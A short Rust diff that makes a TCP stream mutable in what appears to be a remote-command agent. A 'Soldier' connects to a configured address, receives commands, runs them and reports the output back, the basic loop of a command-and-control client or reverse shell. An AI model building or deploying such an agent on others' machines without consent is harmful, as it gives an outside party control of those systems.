@@ -31,10 +31,10 @@ fn main() {
       Ok(_) => {
         loop {*/
     let config = Soldier::config();
-    let tcp_stream = Reporter::connect(config.addr.clone());
-    let commands_recieved = Reporter::receive_commands(&tcp_stream).unwrap();
+    let mut tcp_stream = Reporter::connect(config.addr.clone());
+    let commands_recieved = Reporter::receive_commands(&mut tcp_stream).unwrap();
     let commands_output = Soldier::run_commands(commands_recieved);
-    let _bytes_sent = Reporter::send_report(&tcp_stream, commands_output).unwrap();
+    let _bytes_sent = Reporter::send_report(&mut tcp_stream, commands_output).unwrap();
     Reporter::disconnect(&tcp_stream);
 
     /*
